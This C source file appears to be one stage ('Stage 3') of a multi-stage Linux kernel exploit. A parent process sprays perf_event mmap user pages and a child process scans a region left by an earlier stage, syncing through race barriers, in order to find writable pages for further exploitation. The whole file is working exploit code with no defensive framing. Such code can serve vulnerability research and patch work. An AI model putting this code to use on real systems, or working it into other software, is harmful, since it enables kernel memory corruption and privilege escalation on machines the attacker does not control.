#include "exploit.h"
#include <string.h>
#include <stdint.h>

/* Stage 3
* This exploit stage performs a spray to try and get writable user pages.
* To do this pages of memory are continually allocated by mmaping new perf_events and mapping their user pages.
* The user page is then filled with a pattern and read back through the additional pages in the vma from stage 2.
* If the pattern is found the sprayed pages are filled with their spray indices and then read back again to verify
* that the pattern wasn't by coincidence and to determine the page offsets.
*/

//Dumb wrapper to check if a page already found a corresponding other page
int page_already_found(struct exp_sync_stage3 *exp_data, void* addr, int idx)
{
    for(int i=0; i<exp_data->writable_page_count; i++)
    {
        if(addr && addr==exp_data->writable_pages[i].writable_page)
            return 1;
        else if(idx>=0 && idx==exp_data->writable_pages[i].page_index)
            return 1;
    }
    return 0;
}

void stage3_parent()
{
    struct exp_sync_stage3 *exp_data = &global_exp_data->stage3;
    struct perf_event_attr attrs = {0};
    memset((char*)&attrs,0,sizeof(attrs));
    attrs.size = sizeof(attrs);
    attrs.disabled = 1;
    attrs.exclude_kernel = 1;
    attrs.exclude_hv = 1;
    attrs.type = PERF_TYPE_SOFTWARE;
    attrs.config = PERF_COUNT_SW_DUMMY;
    printf("[P] Starting the spray\n");
    struct spray_map_info *spray_infos = exp_data->spray_infos;
    while(!exp_data->finished)
    {
        race_barrier_wait(&exp_data->rdy_barrier);
        for(int i=0; i<SPRAY_NUM; i++)
        {
            //Don't touch already found pages again
            if(page_already_found(exp_data, NULL, i))
                continue;
            spray_infos[i].fd = perf_event_open(&attrs,0,-1,-1,0);
            if(spray_infos[i].fd<0)
                perror("tmp fd");
            spray_infos[i].map = mmap(0, STAGE3_MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, spray_infos[i].fd, 0);
            if(spray_infos[i].map==MAP_FAILED)
                perror("tmp map");
            else
                memset((void*)spray_infos[i].map, STAGE3_VAL1, PAGE_SIZE);
        }
        race_barrier_wait(&exp_data->spray_barrier);
        while(exp_data->scanning)
        {
            if(exp_data->req_change)
            {
                exp_data->req_change = 0;
                for(int i=0; i<SPRAY_NUM; i++)
                {
                    //Don't touch already found pages again
                    if(page_already_found(exp_data, NULL, i))
                        continue;
                    if(spray_infos[i].map!=MAP_FAILED)
                        memset((void*)spray_infos[i].map, (char)i, PAGE_SIZE);
                }
                race_barrier_wait(&exp_data->change_barrier);
            }
        }
        race_barrier_wait(&exp_data->check_barrier);
        for(int i=0; i<SPRAY_NUM; i++)
        {
            //Don't unmap pages we already determined were found
            if(page_already_found(exp_data, NULL, i))
            {
                continue;
            }
            munmap((void*)spray_infos[i].map, STAGE3_MMAP_SIZE);
            close(spray_infos[i].fd);
        }
        race_barrier_wait(&exp_data->result_barrier);
    }
}

int is_page_same_value(char* page_start, char val)
{
    char* end = page_start+PAGE_SIZE;
    for(char* vcurr = page_start; vcurr<end; vcurr++)
    {
        if(*vcurr != val)
            return 0;
    }
    return 1;
}

int finished_with_stage3(struct exp_sync_stage3 *exp_data)
{
    if(exp_data->writable_page_count == STAGE3_ABS_THRESHOLD)
        return 1;
    if(exp_data->num_iterations == STAGE3_MAX_ITERATIONS)
        return 1;
    if(exp_data->writable_page_count == exp_data->total_page_count)
        return 1;

    if(exp_data->num_iterations < STAGE3_MIN_ITERATIONS)
        return 0;
    //If we've found more than the fraction of remaining iterations we stop early
    //i.e. if writable_page_count/stage3_abs_threshold > 1-num_iterations/max_iterations
    //to work with integers do a slight modification
    //writable_page_count*max_iterations > (max_iterations-num_iterations)*stage3_abs_threshold
    int rem_iterations = STAGE3_MAX_ITERATIONS-exp_data->num_iterations;
    if(exp_data->writable_page_count*STAGE3_MAX_ITERATIONS >= rem_iterations*STAGE3_ABS_THRESHOLD)
        return 1;
    return 0;
}

void stage3_child()
{
    struct exp_sync_stage3 *exp_data = &global_exp_data->stage3;
    exp_data->writable_page_count = 0;
    char* addr = (char*)exp_data->mapped_start;
    char* addr_end = (char*)exp_data->mapped_end;
    exp_data->total_page_count = (addr_end-addr)/PAGE_SIZE;
    printf("[C] Scanning %d pages, range %p-%p\n", exp_data->total_page_count, addr, addr_end);
    while(!exp_data->finished)
    {
        exp_data->num_iterations++;
        char* curr = addr;
        race_barrier_wait(&exp_data->rdy_barrier);

        exp_data->scanning = 1;
        race_barrier_wait(&exp_data->spray_barrier);
        //We only check the first char on the page, because if we find a change in another char we will never pass the check if the whole page is identical anyway
        for(;curr<addr_end; curr+=PAGE_SIZE)
        {
            //If we get to a page we already found we can skip the whole page
            if(page_already_found(exp_data,curr, -1))
            {
                continue;
            }
            //Found anything
            if(*curr)
            {
            }
            //Found correct value
            if(*curr == STAGE3_VAL1)
            {
                char* curr_page = (char*)(((uint64_t)(curr))&~(4095ULL));
                if(!is_page_same_value(curr_page, STAGE3_VAL1))
                    continue;

                //Request other process to overwrite pages with indices
                exp_data->req_change = 1;
                race_barrier_wait(&exp_data->change_barrier);
                //We fill each page with its index and check if the whole page changed

                //Page was coincidentally as we were expecting, but didn't change later
                //Skip to next page

                char first_val = *curr_page;
                
                if(!is_page_same_value(curr_page, first_val))
                    continue;

                int idx = exp_data->writable_page_count;
                exp_data->writable_pages[idx].writable_page = curr_page;
                exp_data->writable_pages[idx].page_index = (int)first_val;
                exp_data->writable_page_count++;
            }
        }
        exp_data->scanning = 0;
        race_barrier_wait(&exp_data->check_barrier);
        if(finished_with_stage3(exp_data))
        {
            printf("[C] Unmapping readable pages with writable counterpart\n");
            for(int i=0; i<exp_data->writable_page_count; i++)
            {
                void* curr_page = (void*)exp_data->writable_pages[i].writable_page;
                if(munmap(curr_page,PAGE_SIZE)<0)
                {
                    perror("[C] munmap writable");
                }
            }
            exp_data->finished = 1;
        }
        exp_data->scan_done = 1;
        exp_data->scanning = 0;
        race_barrier_wait(&exp_data->result_barrier);
    }
}